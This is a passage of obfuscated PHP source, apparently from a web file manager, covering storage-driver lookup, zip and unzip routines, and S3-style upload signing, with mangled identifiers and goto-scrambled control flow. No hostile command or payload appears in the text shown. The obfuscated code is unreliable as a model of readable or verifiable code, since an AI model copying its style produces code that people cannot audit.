$AÚ´ñ«Î·ê + $AˆáÌôü≥¬; } goto cËÁ¡¨’÷†; bÿç±¡äÆ§: } private static function driverMake(&$DóÚë÷Ú±°) { goto D¡≤àÔ»∞Ö; D¡≤àÔ»∞Ö: $Bâ•ô…∞àè =& $_SERVER[Öíæ€“”≠éÏË]; $DåÚﬁó√£à = KodIO::parse($DóÚë÷Ú±°); if (!self::$driverListSystem) { $C…ÃÖ≤à‹ñ = Model($Bâ•ô…∞àè[740])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($C…ÃÖ≤à‹ñ, $Bâ•ô…∞àè[394]); } goto eöä∆‰◊„¿; eöä∆‰◊„¿: if ($DåÚﬁó√£à[$Bâ•ô…∞àè[29]] == KodIO::KOD_IO && !self::$driverListSystem[$DåÚﬁó√£à[$Bâ•ô…∞àè[394]]]) { return !1; } $DóÚë÷Ú±° = $DåÚﬁó√£à[$Bâ•ô…∞àè[1073]]; $fÙµ¢Û≠™Â = self::driverGet($DåÚﬁó√£à, $DóÚë÷Ú±°); goto e◊ëÏ∂Ô€Î; e◊ëÏ∂Ô€Î: return $fÙµ¢Û≠™Â; goto A•òõ≈ÎÆ•; A•òõ≈ÎÆ•: } private static function driverGet($Eê¿üÚù∏, &$Båãßö®‡ã) { goto C√·Œ≥ËØÜ; E≥Èåî˜˘¬: $fâãêû∞ü– = self::$driverCache[$E€ÿ·•Øó€]; $fâãêû∞ü–->pathDriver = $d¡÷ﬂÿ´Ï«; $fâãêû∞ü–->pathBase = $bÔ°±üåº°[33]; goto aªπ¨™÷≈¬; cÓÂíøñâ: switch ($Eê¿üÚù∏[$bÔ°±üåº°[29]]) { case KodIO::KOD_IO: $aß¿¯…ﬁ‚¶ = self::$driverListSystem[$bµÏâÁ«ùÇ]; break; case KodIO::KOD_SOURCE: $Båãßö®‡ã = $bµÏâÁ«ùÇ . $Båãßö®‡ã; $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1076], $bÔ°±üåº°[6] => $Eê¿üÚù∏); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $E◊—ï˜´µó = $GLOBALS[$bÔ°±üåº°[1077]]; self::$driverListUser = array_to_keyvalue($E◊—ï˜´µó, $bÔ°±üåº°[394]); } $aß¿¯…ﬁ‚¶ = self::$driverListUser[$bµÏâÁ«ùÇ]; break; case KodIO::KOD_SHARE_LINK: $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1078], $bÔ°±üåº°[6] => $Eê¿üÚù∏); $Fèô≠äÖ‚º = Action($bÔ°±üåº°[1079])->sharePathInfo($Eê¿üÚù∏[$bÔ°±üåº°[76]]); $Båãßö®‡ã = $Fèô≠äÖ‚º[$bÔ°±üåº°[396]]; if (!$Fèô≠äÖ‚º[$bÔ°±üåº°[396]]) { $FìåÂä¥¬é = Model($bÔ°±üåº°[577])->getInfo($Fèô≠äÖ‚º[$bÔ°±üåº°[469]]); $Båãßö®‡ã = KodIO::clear($FìåÂä¥¬é[$bÔ°±üåº°[1080]] . $Eê¿üÚù∏[$bÔ°±üåº°[1073]]); $Eê¿üÚù∏[$bÔ°±üåº°[467]] = $FìåÂä¥¬é; $Eê¿üÚù∏[$bÔ°±üåº°[1057]] = $Båãßö®‡ã; $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1081], $bÔ°±üåº°[6] => $Eê¿üÚù∏); } break; case KodIO::KOD_SHARE_ITEM: $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1082], $bÔ°±üåº°[6] => $Eê¿üÚù∏); $FìåÂä¥¬é = Model($bÔ°±üåº°[577])->getInfo($Eê¿üÚù∏[$bÔ°±üåº°[394]]); if ($FìåÂä¥¬é[$bÔ°±üåº°[396]] == $bÔ°±üåº°[191]) { $Båãßö®‡ã = KodIO::clear($FìåÂä¥¬é[$bÔ°±üåº°[1080]] . $Eê¿üÚù∏[$bÔ°±üåº°[1073]]); $Eê¿üÚù∏[$bÔ°±üåº°[467]] = $FìåÂä¥¬é; $Eê¿üÚù∏[$bÔ°±üåº°[1057]] = $Båãßö®‡ã; $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1083], $bÔ°±üåº°[6] => $Eê¿üÚù∏); } else { if (!$Båãßö®‡ã) { $Båãßö®‡ã = $FìåÂä¥¬é[$bÔ°±üåº°[396]]; } } break; default: $Båãßö®‡ã = $Eê¿üÚù∏[$bÔ°±üåº°[76]]; $aß¿¯…ﬁ‚¶ = array($bÔ°±üåº°[1075] => $bÔ°±üåº°[1084]); break; } $E€ÿ·•Øó€ = $Eê¿üÚù∏[$bÔ°±üåº°[76]]; if (!isset(self::$driverCache[$E€ÿ·•Øó€])) { $aœÇ˘‘÷ÃÔ = strtolower($aß¿¯…ﬁ‚¶[$bÔ°±üåº°[94]]); $B“Ò˘◊¨é = $GLOBALS[$bÔ°±üåº°[6]][$bÔ°±üåº°[88]][$bÔ°±üåº°[804]]; $Eâ‹•äåÆ† = $bÔ°±üåº°[72] . (isset($B“Ò˘◊¨é[$aœÇ˘‘÷ÃÔ]) ? $B“Ò˘◊¨é[$aœÇ˘‘÷ÃÔ] : ucfirst($aœÇ˘‘÷ÃÔ)); if (!class_exists($Eâ‹•äåÆ†)) { show_json("{$Eâ‹•äåÆ†}\40\x6e\x6f\164\x20\x65\x78\151\x73\x74\163\41", !1); } $fàÕƒ∫Ú„≥ = isset($aß¿¯…ﬁ‚¶[$bÔ°±üåº°[6]]) ? $aß¿¯…ﬁ‚¶[$bÔ°±üåº°[6]] : !1; self::$driverCache[$E€ÿ·•Øó€] = new $Eâ‹•äåÆ†($fàÕƒ∫Ú„≥); } goto E≥Èåî˜˘¬; C√·Œ≥ËØÜ: $bÔ°±üåº° =& $_SERVER[Öíæ€“”≠éÏË]; $d¡÷ﬂÿ´Ï« = $Eê¿üÚù∏[$bÔ°±üåº°[1074]]; $bµÏâÁ«ùÇ = $Eê¿üÚù∏[$bÔ°±üåº°[394]]; goto cÓÂíøñâ; dƒ≤ ëÙœ˜: $fâãêû∞ü–->path = $Båãßö®‡ã; return $fâãêû∞ü–; goto cæè◊‡∑·÷; aªπ¨™÷≈¬: if (isset($aß¿¯…ﬁ‚¶[$bÔ°±üåº°[6]][$bÔ°±üåº°[1085]])) { $fâãêû∞ü–->pathBase = rtrim($aß¿¯…ﬁ‚¶[$bÔ°±üåº°[6]][$bÔ°±üåº°[1085]], $bÔ°±üåº°[8]) . $bÔ°±üåº°[8]; $Båãßö®‡ã = $fâãêû∞ü–->pathBase . ltrim($Båãßö®‡ã, $bÔ°±üåº°[8]); } $Båãßö®‡ã = $fâãêû∞ü–->getPath($Båãßö®‡ã); if (isset($Eê¿üÚù∏[$bÔ°±üåº°[1057]])) { $Båãßö®‡ã = $Eê¿üÚù∏[$bÔ°±üåº°[1057]]; } goto dƒ≤ ëÙœ˜; cæè◊‡∑·÷: } public static function errorTips($aã¶≤æÙ∫‘ = false) { goto açﬁö‘°Ø; c Ó…Ç’ø‡: $d≤˜∏Â©æƒ[] = $aã¶≤æÙ∫‘; write_log($AÜ≤»√Ò¢Û[160] . ACTION . $AÜ≤»√Ò¢Û[1086] . $aã¶≤æÙ∫‘, $AÜ≤»√Ò¢Û[1087]); goto B√≈Ü∑ºﬂÃ; A¯˜¬Çàôﬁ: if ($aã¶≤æÙ∫‘ === -1) { return $d≤˜∏Â©æƒ ? $d≤˜∏Â©æƒ[count($d≤˜∏Â©æƒ) - 1] : $AÜ≤»√Ò¢Û[33]; } if ($aã¶≤æÙ∫‘ === !1) { return implode($AÜ≤»√Ò¢Û[229], $d≤˜∏Â©æƒ); } if (count($d≤˜∏Â©æƒ) >= $D≤ÉÎ®ç¨ú) { $d≤˜∏Â©æƒ = array_slice($d≤˜∏Â©æƒ, $D≤ÉÎ®ç¨ú * 0.5, $D≤ÉÎ®ç¨ú); } goto c Ó…Ç’ø‡; açﬁö‘°Ø: $AÜ≤»√Ò¢Û =& $_SERVER[Öíæ€“”≠éÏË]; static $d≤˜∏Â©æƒ = array(); $D≤ÉÎ®ç¨ú = 1000; goto A¯˜¬Çàôﬁ; B√≈Ü∑ºﬂÃ: } public static function getLastError($dÒÑÊ´ﬁú” = '') { $cŸÜºß˜Í’ = self::errorTips(-1); return $cŸÜºß˜Í’ ? $cŸÜºß˜Í’ : $dÒÑÊ´ﬁú”; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $B¬ÒÚà®Ü⁄; if (!$B¬ÒÚà®Ü⁄) { $a‰ÚÛÏƒ÷’ = IO::init($_SERVER[Öíæ€“”≠éÏË][8]); } return $a‰ÚÛÏƒ÷’; } private static function iconvSystem($cÖ®èÛ®É ) { return self::local()->iconvSystem($cÖ®èÛ®É ); } private static function iconvApp($d≠åØû›ñ∂) { return self::local()->iconvApp($d≠åØû›ñ∂); } public static function zip($fÛÁ›§ãñÉ, $aÛë∆‚≈ûà = "\x7a\151\x70", $F‹ëÀ€ò¢Ü = '', $aÓÁ√àπµá = REPEAT_RENAME) { goto DáºŸ·ë©¯; aµÈ∂®Öìä: $eƒ´Â…¬¯á = $CŒÓÜ≈°‰¿ . $CΩÒß≥“˜≥ . $e¨Ó∂±òπ™[95] . $aÛë∆‚≈ûà; $eƒ´Â…¬¯á = get_filename_auto($eƒ´Â…¬¯á, $e¨Ó∂±òπ™[33], $aÓÁ√àπµá); $BèÜÊìåâª = self::iconvSystem($eƒ´Â…¬¯á); goto DßêÇûÉÈÃ; cœÈ≥Íº⁄ë: if ($F‹ëÀ€ò¢Ü || !$Fò®Ì©°Û¬) { if ($Fò®Ì©°Û¬ && strstr($Fò®Ì©°Û¬, TEMP_FILES)) { $b‡á±•Õªù = $B±Ò≠ò©ÊË = array(); recursion_dir($CŒÓÜ≈°‰¿, $b‡á±•Õªù, $B±Ò≠ò©ÊË, 0); foreach ($b‡á±•Õªù as $BëÓº«ÚÙ„) { del_dir($BëÓº«ÚÙ„); } foreach ($B±Ò≠ò©ÊË as $a∏¥§œÑ–≈) { if ($a∏¥§œÑ–≈ == $BèÜÊìåâª) { continue; } del_file($a∏¥§œÑ–≈); } } return $eƒ´Â…¬¯á; } $dÿùË∏ñÑ˜ = self::pathFather($B¶ñœüêÂ«[$e¨Ó∂±òπ™[76]]); $AπÜÑó˜’∆ = self::move($eƒ´Â…¬¯á, $dÿùË∏ñÑ˜, $aÓÁ√àπµá); goto c¬€êà´Èã; DßêÇûÉÈÃ: foreach ($B±Ò≠ò©ÊË as $càä®™Ÿ¿÷ => $a∑åÑØø©Î) { $B±Ò≠ò©ÊË[$càä®™Ÿ¿÷] = self::iconvSystem($a∑åÑØø©Î); } KodArchive::create($BèÜÊìåâª, $B±Ò≠ò©ÊË); if (!IO::exist($eƒ´Â…¬¯á)) { if ($Fò®Ì©°Û¬) { del_dir($Fò®Ì©°Û¬); } show_json(LNG($e¨Ó∂±òπ™[1090]), !1); } goto cœÈ≥Íº⁄ë; c¬€êà´Èã: if (!$AπÜÑó˜’∆) { del_dir($Fò®Ì©°Û¬); show_json(LNG($e¨Ó∂±òπ™[1090]), !1); } del_dir($Fò®Ì©°Û¬); return $AπÜÑó˜’∆; goto FÔª⁄óíΩ¬; FÎæ·°‰Ö§: if (count($B±Ò≠ò©ÊË) > 1) { $FââªÃçÚ‚ = IO::info(IO::pathFather($B¶ñœüêÂ«[$e¨Ó∂±òπ™[76]])); $CΩÒß≥“˜≥ = $FââªÃçÚ‚[$e¨Ó∂±òπ™[28]]; } $CŒÓÜ≈°‰¿ = $Fò®Ì©°Û¬; if (!$CŒÓÜ≈°‰¿) { $CŒÓÜ≈°‰¿ = get_path_father($B¶ñœüêÂ«[$e¨Ó∂±òπ™[76]]); if (!$F‹ëÀ€ò¢Ü && $fƒ‰†”‚ÉÒ->getType() == $e¨Ó∂±òπ™[106]) { $CŒÓÜ≈°‰¿ = get_path_father($fƒ‰†”‚ÉÒ->path); } $E∂â◊·¨«É = IO::info($CŒÓÜ≈°‰¿); if (!$E∂â◊·¨«É[$e¨Ó∂±òπ™[196]]) { show_json(LNG($e¨Ó∂±òπ™[1089]), !1); } } goto aµÈ∂®Öìä; d€¶ŒÙÑè≈: $Fò®Ì©°Û¬ = !1; if (!$F‹ëÀ€ò¢Ü && $fƒ‰†”‚ÉÒ->getType() == $e¨Ó∂±òπ™[106]) { $B±Ò≠ò©ÊË = self::zipFileList($fÛÁ›§ãñÉ); } else { $Fò®Ì©°Û¬ = $F‹ëÀ€ò¢Ü ? $F‹ëÀ€ò¢Ü : TEMP_FILES . $e¨Ó∂±òπ™[1088] . time() . rand_string(8) . $e¨Ó∂±òπ™[8]; mk_dir($Fò®Ì©°Û¬); $B±Ò≠ò©ÊË = self::zipFileList($fÛÁ›§ãñÉ, $Fò®Ì©°Û¬); } $CΩÒß≥“˜≥ = $B¶ñœüêÂ«[$e¨Ó∂±òπ™[28]]; goto FÎæ·°‰Ö§; DáºŸ·ë©¯: $e¨Ó∂±òπ™ =& $_SERVER[Öíæ€“”≠éÏË]; $fƒ‰†”‚ÉÒ = self::init($fÛÁ›§ãñÉ[0][$e¨Ó∂±òπ™[76]]); $B¶ñœüêÂ« = self::info($fÛÁ›§ãñÉ[0][$e¨Ó∂±òπ™[76]]); goto d€¶ŒÙÑè≈; FÔª⁄óíΩ¬: } public static function unzip($Båÿâ≈Ç≈Ï, $EíÛÇ≥Œ€æ = "\162\145\160\x6c\x61\x63\x65") { goto aÛ´ï¬ª‰ÿ; D≤π⁄ÇÁ’µ: return !0; goto B©ØßòÖùú; B±∫•‚¯∞Î: Hook::trigger($d£«™éˆß†[1098], $bçÀ‹∂áòí); recursion_dir($bçÀ‹∂áòí, $E∆ŒŸàë¿ü, $bçŒÙ–Ëà±, 0); $F‘À”À‘»É = array_merge($E∆ŒŸàë¿ü, $bçŒÙ–Ëà±); goto DâÚ∑Õ≥ÿÇ; EÃ≠Ó”ïŸµ: $F∏÷–èÑˆé = self::tmpFileName($c”«≠‰Óƒµ); $bçÀ‹∂áòí = TEMP_FILES . $F∏÷–èÑˆé; del_dir($bçÀ‹∂áòí); goto D„øŒ»Ôâ; DâÚ∑Õ≥ÿÇ: foreach ($F‘À”À‘»É as $A¯‰≈â¡≈ú) { $A¯‰≈â¡≈ú = self::iconvApp($A¯‰≈â¡≈ú); self::move($A¯‰≈â¡≈ú, $bàÇ¥∂—ıı, $EíÛÇ≥Œ€æ); } del_dir($bçÀ‹∂áòí); if (!$D¢Ì∑√–Óí) { del_file($D»ê÷õ¢™); } goto D≤π⁄ÇÁ’µ; f±≥ıÃóÑÉ: if (!@file_exists(self::iconvSystem($D»ê÷õ¢™))) { $D¢Ì∑√–Óí = self::localFilePath($CÇÀÁ„√†•, $EﬂÂ…€á«û); $D»ê÷õ¢™ = $D¢Ì∑√–Óí ? $D¢Ì∑√–Óí : parent::download($CÇÀÁ„√†•, $D»ê÷õ¢™); } $D»ê÷õ¢™ = self::iconvSystem($D»ê÷õ¢™); $c≈çÚç®⁄⁄ = isset($Båÿâ≈Ç≈Ï[$d£«™éˆß†[1093]]) ? $Båÿâ≈Ç≈Ï[$d£«™éˆß†[1093]] : $d£«™éˆß†[1094]; goto F∂∞Ñ◊çå–; D„øŒ»Ôâ: mk_dir($bçÀ‹∂áòí); $EﬂÂ…€á«û = self::fileExt($c”«≠‰Óƒµ); $D»ê÷õ¢™ = $bçÀ‹∂áòí . $d£«™éˆß†[95] . $EﬂÂ…€á«û; goto f±≥ıÃóÑÉ; cÓ´ß´∫—¢: if (!($c”«≠‰Óƒµ = parent::info($CÇÀÁ„√†•))) { show_json(LNG($d£«™éˆß†[1092]), !1); } if (!($e∑æπ±‚úœ = parent::infoFull($bàÇ¥∂—ıı))) { $bàÇ¥∂—ıı = parent::mkdir($bàÇ¥∂—ıı); $e∑æπ±‚úœ = array($d£«™éˆß†[76] => $bàÇ¥∂—ıı); } else { if (isset($e∑æπ±‚úœ[$d£«™éˆß†[396]]) && trim($e∑æπ±‚úœ[$d£«™éˆß†[76]], $d£«™éˆß†[8]) != trim($bàÇ¥∂—ıı, $d£«™éˆß†[8])) { $C±ä√±çæº = KodIO::make($e∑æπ±‚úœ[$d£«™éˆß†[479]]); $e¢èµîà¢Ö = parent::fileNameAuto($C±ä√±çæº, $e∑æπ±‚úœ[$d£«™éˆß†[28]], REPEAT_RENAME_FOLDER, !0); $bàÇ¥∂—ıı = parent::mkdir($C±ä√±çæº . $e¢èµîà¢Ö); $e∑æπ±‚úœ = array($d£«™éˆß†[76] => $bàÇ¥∂—ıı); } } $bàÇ¥∂—ıı = $e∑æπ±‚úœ[$d£«™éˆß†[76]]; goto EÃ≠Ó”ïŸµ; F∂∞Ñ◊çå–: $CŒáÔ™Ë∑∞ = KodArchive::extract($D»ê÷õ¢™, $bçÀ‹∂áòí . $d£«™éˆß†[8], $c≈çÚç®⁄⁄); self::archiveExt(); if (!$CŒáÔ™Ë∑∞[$d£«™éˆß†[1095]]) { show_json($d£«™éˆß†[1096] . $CŒáÔ™Ë∑∞[$d£«™éˆß†[1097]], !1); } goto B±∫•‚¯∞Î; aÛ´ï¬ª‰ÿ: $d£«™éˆß† =& $_SERVER[Öíæ€“”≠éÏË]; $CÇÀÁ„√†• = $Båÿâ≈Ç≈Ï[$d£«™éˆß†[76]]; $bàÇ¥∂—ıı = $Båÿâ≈Ç≈Ï[$d£«™éˆß†[1091]]; goto cÓ´ß´∫—¢; B©ØßòÖùú: } public static function unzipList($EÎΩ›Êè’®) { goto CÓ—Í≥ò”ø; bÜ´ªÉ˜´ô: if (!is_dir($A£ïˆÃﬁ‹’)) { mk_dir($A£ïˆÃﬁ‹’); } $b≤≥≈Ωÿ¬ù = $A£ïˆÃﬁ‹’ . $búâÃöÜ¨÷[8] . $eçÈá◊Á…©; if (!@file_exists(self::iconvSystem($b≤≥≈Ωÿ¬ù))) { if (isset($AÈ±ûå‘õ…)) { url_request($d©ÀûëÓﬂ, $búâÃöÜ¨÷[1102], $b≤≥≈Ωÿ¬ù); } else { $a≤Ωò÷‹¬† = self::localFilePath($d©ÀûëÓﬂ, $AÉò«‡£Ø˜); $b≤≥≈Ωÿ¬ù = $a≤Ωò÷‹¬† ? $a≤Ωò÷‹¬† : self::download($d©ÀûëÓﬂ, $b≤≥≈Ωÿ¬ù); } } goto Dí≠û‘ﬂÚ°; a∆≈§æ∞áÊ: $C•ç˜êªÖ± = json_encode($Eòü”ﬂµø∆[$búâÃöÜ¨÷[1097]]); self::setContent($EªÚì·Áö¨, $C•ç˜êªÖ±); if (count($Eòü”ﬂµø∆[$búâÃöÜ¨÷[1097]]) >= $f≤ΩóÉŸÙò) { show_json(sprintf(LNG($búâÃöÜ¨÷[1101]), count($Eòü”ﬂµø∆[$búâÃöÜ¨÷[1097]])), !1); } goto dèó“Ø¯äå; CÓ—Í≥ò”ø: $búâÃöÜ¨÷ =& $_SERVER[Öíæ€“”≠éÏË]; $d©ÀûëÓﬂ = $EÎΩ›Êè’®[$búâÃöÜ¨÷[76]]; $c––¿“ìÿä = isset($EÎΩ›Êè’®[$búâÃöÜ¨÷[1099]]) ? $EÎΩ›Êè’®[$búâÃöÜ¨÷[1099]] : -1; goto B◊Ì∆è≠˘´; aì√«Û‚”ﬁ: $c‹ÿ¶…π∏√ = self::info($a◊àÍö±≈Ó); $AÉò«‡£Ø˜ = self::fileExt($c‹ÿ¶…π∏√); $aÕïñüÃ≥ = self::tmpFileName($c‹ÿ¶…π∏√); goto fåäß¿ô∫; dèó“Ø¯äå: return $Eòü”ﬂµø∆[$búâÃöÜ¨÷[1097]]; goto A…§Á¬«Ó¡; fåäß¿ô∫: if (isset($AÈ±ûå‘õ…)) { $dı¯Òã¥¡ú = array($AÈ±ûå‘õ…[$búâÃöÜ¨÷[76]], $AÈ±ûå‘õ…[$búâÃöÜ¨÷[1099]], $AÈ±ûå‘õ…[$búâÃöÜ¨÷[28]]); $eçÈá◊Á…© = md5(implode($búâÃöÜ¨÷[71], $dı¯Òã¥¡ú)) . $búâÃöÜ¨÷[95] . get_path_ext($AÈ±ûå‘õ…[$búâÃöÜ¨÷[28]]); } else { $dı¯Òã¥¡ú = array($c‹ÿ¶…π∏√[$búâÃöÜ¨÷[28]], $c‹ÿ¶…π∏√[$búâÃöÜ¨÷[76]], $c‹ÿ¶…π∏√[$búâÃöÜ¨÷[78]]); $eçÈá◊Á…© = md5(implode($búâÃöÜ¨÷[71], $dı¯Òã¥¡ú)) . $búâÃöÜ¨÷[95] . $AÉò«‡£Ø˜; } if ($c––¿“ìÿä == -1) { $EªÚì·Áö¨ = IO_PATH_SYSTEM_TEMP . "\172\151\x70\x56\151\x65\x77\x2f{$aÕïñüÃ≥}\x2f{$eçÈá◊Á…©}\x2e\154\157\147"; $E• ßàª≈˜ = self::infoFull($EªÚì·Áö¨); if ($E• ßàª≈˜) { $EªÚì·Áö¨ = $E• ßàª≈˜[$búâÃöÜ¨÷[76]]; $AîÖõÜØëã = self::getContent($EªÚì·Áö¨); if ($AîÖõÜØëã) { $C•ç˜êªÖ± = json_decode($AîÖõÜØëã, !0); if (count($C•ç˜êªÖ±) >= $f≤ΩóÉŸÙò) { show_json(sprintf(LNG($búâÃöÜ¨÷[1101]), count($C•ç˜êªÖ±)), !1); } return $C•ç˜êªÖ±; } } else { $EªÚì·Áö¨ = self::mkfile($EªÚì·Áö¨); } } $A£ïˆÃﬁ‹’ = TEMP_FILES . $aÕïñüÃ≥; goto bÜ´ªÉ˜´ô; Dí≠û‘ﬂÚ°: $b≤≥≈Ωÿ¬ù = self::iconvSystem($b≤≥≈Ωÿ¬ù); if ($c––¿“ìÿä >= 0) { $bÆÁ‚¯ã„∫ = isset($EÎΩ›Êè’®[$búâÃöÜ¨÷[1103]]) ? $EÎΩ›Êè’®[$búâÃöÜ¨÷[1103]] : !1; $döÖ†€¿Ó… = isset($EÎΩ›Êè’®[$búâÃöÜ¨÷[28]]) ? $EÎΩ›Êè’®[$búâÃöÜ¨÷[28]] : $búâÃöÜ¨÷[33]; KodArchive::filePreview($b≤≥≈Ωÿ¬ù, $c––¿“ìÿä, $bÆÁ‚¯ã„∫, $döÖ†€¿Ó…); self::archiveExt(); die; } $Eòü”ﬂµø∆ = KodArchive::listContent($b≤≥≈Ωÿ¬ù); goto dô”ïô¬ØÊ; dô”ïô¬ØÊ: self::archiveExt(); del_dir($A£ïˆÃﬁ‹’); if (!$Eòü”ﬂµø∆[$búâÃöÜ¨÷[1095]]) { show_json($Eòü”ﬂµø∆[$búâÃöÜ¨÷[1097]], !1); } goto a∆≈§æ∞áÊ; B◊Ì∆è≠˘´: $f≤ΩóÉŸÙò = 50000; if (request_url_safe($d©ÀûëÓﬂ)) { $AÈ±ûå‘õ… = parse_url_query($d©ÀûëÓﬂ); if (!isset($AÈ±ûå‘õ…[$búâÃöÜ¨÷[76]])) { show_json($búâÃöÜ¨÷[1100], !1); } } $a◊àÍö±≈Ó = isset($AÈ±ûå‘õ…) ? $AÈ±ûå‘õ…[$búâÃöÜ¨÷[76]] : $d©ÀûëÓﬂ; goto aì√«Û‚”ﬁ; A…§Á¬«Ó¡: } private static function fileExt($bâ¢¥µç‹‰) { $FÂ‚ò¥ç¿¿ =& $_SERVER[Öíæ€“”≠éÏË]; $BÑËÒÏ„ï◊ = $bâ¢¥µç‹‰[$FÂ‚ò¥ç¿¿[168]]; if ($BÑËÒÏ„ï◊ == $FÂ‚ò¥ç¿¿[1104]) { $cíÍ≠ ¶Œ = $FÂ‚ò¥ç¿¿[1105]; if (substr($bâ¢¥µç‹‰[$FÂ‚ò¥ç¿¿[28]], -strlen($cíÍ≠ ¶Œ)) == $cíÍ≠ ¶Œ) { $BÑËÒÏ„ï◊ = $FÂ‚ò¥ç¿¿[1106]; } } self::archiveExt($BÑËÒÏ„ï◊); return $BÑËÒÏ„ï◊; } private static function zipFileList($A§ïûÁ†ûâ, $BÇÇ°°ºà• = false) { $B‚ã˜ÈΩÜê =& $_SERVER[Öíæ€“”≠éÏË]; $fú´Ñã·À = array(); foreach ($A§ïûÁ†ûâ as $d«ÑÃ…¢ﬂﬂ) { $A¢éπ≠ﬂòˆ = $d«ÑÃ…¢ﬂﬂ[$B‚ã˜ÈΩÜê[76]]; if ($BÇÇ°°ºà•) { $A¢éπ≠ﬂòˆ = self::copy($d«ÑÃ…¢ﬂﬂ[$B‚ã˜ÈΩÜê[76]], $BÇÇ°°ºà•, $B‚ã˜ÈΩÜê[796]); } else { $aóùí¢¨àç = self::init($d«ÑÃ…¢ﬂﬂ[$B‚ã˜ÈΩÜê[76]]); if ($aóùí¢¨àç->getType() == $B‚ã˜ÈΩÜê[106]) { $A¢éπ≠ﬂòˆ = $aóùí¢¨àç->path; } } if ($A¢éπ≠ﬂòˆ && self::local()->exist($A¢éπ≠ﬂòˆ)) { $fú´Ñã·À[$d«ÑÃ…¢ﬂﬂ[$B‚ã˜ÈΩÜê[76]]] = $A¢éπ≠ﬂòˆ; } } if (!empty($fú´Ñã·À)) { return array_values($fú´Ñã·À); } show_json(LNG($B‚ã˜ÈΩÜê[1070]), !1); } public static function tmpFileName($c—¯∂ŸÓ∆Í) { $a∑âµ¥Û’• =& $_SERVER[Öíæ€“”≠éÏË]; $f…‚øëÁﬁ∆ = array($c—¯∂ŸÓ∆Í[$a∑âµ¥Û’•[28]], $c—¯∂ŸÓ∆Í[$a∑âµ¥Û’•[76]], $c—¯∂ŸÓ∆Í[$a∑âµ¥Û’•[78]], $c—¯∂ŸÓ∆Í[$a∑âµ¥Û’•[503]]); return md5(implode($a∑âµ¥Û’•[71], $f…‚øëÁﬁ∆)); } private static function localFilePath($bîöè±Â÷à, $DÊôò¢Õú¿) { goto fËÚ÷ÕÖôç; fËÚ÷ÕÖôç: $EÚïáä‰ÕÁ =& $_SERVER[Öíæ€“”≠éÏË]; if ($DÊôò¢Õú¿ == $EÚïáä‰ÕÁ[1107] && strtoupper(substr(PHP_OS, 0, 3)) == $EÚïáä‰ÕÁ[1108]) { return !1; } $eâü¥Á‚›≥ = KodIO::parse($bîöè±Â÷à); goto Fä¥à„ØŒ·; FÓÑúîóÍ«: if ($DíãºÙıÀã == $EÚïáä‰ÕÁ[106] || $DíãºÙıÀã == $EÚïáä‰ÕÁ[1110]) { if (!$eÚà¯ØÍ∑•->exist($eÚà¯ØÍ∑•->path)) { show_json(LNG($EÚïáä‰ÕÁ[105]), !1); } return $eÚà¯ØÍ∑•->path; } return !1; goto FÌÁ‘Ì≠ïœ; Fä¥à„ØŒ·: if ($eâü¥Á‚›≥[$EÚïáä‰ÕÁ[29]] == KodIO::KOD_SOURCE) { $A˘æÙÿ∫Ñƒ = Model($EÚïáä‰ÕÁ[803])->fileInfoGet(KodIO::sourceID($bîöè±Â÷à)); if (!$A˘æÙÿ∫Ñƒ[$EÚïáä‰ÕÁ[76]]) { show_json($EÚïáä‰ÕÁ[1109], !1); } $bîöè±Â÷à = $A˘æÙÿ∫Ñƒ[$EÚïáä‰ÕÁ[76]]; } $eÚà¯ØÍ∑• = self::init($bîöè±Â÷à); $DíãºÙıÀã = $eÚà¯ØÍ∑•->getType(); goto FÓÑúîóÍ«; FÌÁ‘Ì≠ïœ: } private static function archiveExt($e£∆èç≈™Ê = '') { $GLOBALS[$_SERVER[Öíæ€“”≠éÏË][1111]] = $e£∆èç≈™Ê; } } goto A∫¶¿óõƒ«; cÓâ©Ù”∆®: class PathDriverEDS extends PathDriverMinIO { public function __construct($bÇ¥“Ç∏‰”) { parent::__construct($bÇ¥“Ç∏‰”); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($a€ø‘å∏‚µ) { parent::__construct($a€ø‘å∏‚µ); $this->signatureVersion($_SERVER[Öíæ€“”≠éÏË][212]); } public function uploadFormData($cùãèÕØæÉ, $c⁄◊çêÑ¨« = 3600) { goto B©äÈÇ¡‡Æ; aﬂ∂âøòˆ∫: $e≈üÈ·é¯⁄ = base64_encode(json_encode($EŸÈêÖÕ≥—)); $fŒ‰È»ãêâ = hash_hmac($A”Àî‡§·Ñ[1245], $eÒ∑≈Öﬁä®, $A”Àî‡§·Ñ[1246] . $this->secret, !0); $C£÷¢∑ú≥Í = hash_hmac($A”Àî‡§·Ñ[1245], $this->region, $fŒ‰È»ãêâ, !0); goto DûÜ√ÿÜê∞; fÖ´™°çå∆: $eÿçÑ≠¢ˆù = $A”Àî‡§·Ñ[1237]; $D◊Í¬∂ÉÁ⁄ = $c⁄◊çêÑ¨« . $A”Àî‡§·Ñ[33]; $B∞≠¬»„åà = $A”Àî‡§·Ñ[1198]; goto d¡å–ÍÆÖŒ; B©äÈÇ¡‡Æ: $A”Àî‡§·Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $C´ﬂ¬ã∞É© = $A”Àî‡§·Ñ[192]; $dâùÿ√Üç‡ = $A”Àî‡§·Ñ[1235]; goto açË”‡’Ó„; DûÜ√ÿÜê∞: $C·´ÒËûø = hash_hmac($A”Àî‡§·Ñ[1245], $aè≥≤Õ∆öÇ, $C£÷¢∑ú≥Í, !0); $b”π≈Ã±…Û = hash_hmac($A”Àî‡§·Ñ[1245], $eÿçÑ≠¢ˆù, $C·´ÒËûø, !0); $b‚Ó±è®âÃ = hash_hmac($A”Àî‡§·Ñ[1245], $e≈üÈ·é¯⁄, $b”π≈Ã±…Û); goto Eïêñ»òπ©; d¡å–ÍÆÖŒ: $C√ﬂàùßº¡ = array($this->accessKey, $eÒ∑≈Öﬁä®, $this->region, $aè≥≤Õ∆öÇ, $eÿçÑ≠¢ˆù); $DÜµàÀ“±Á = 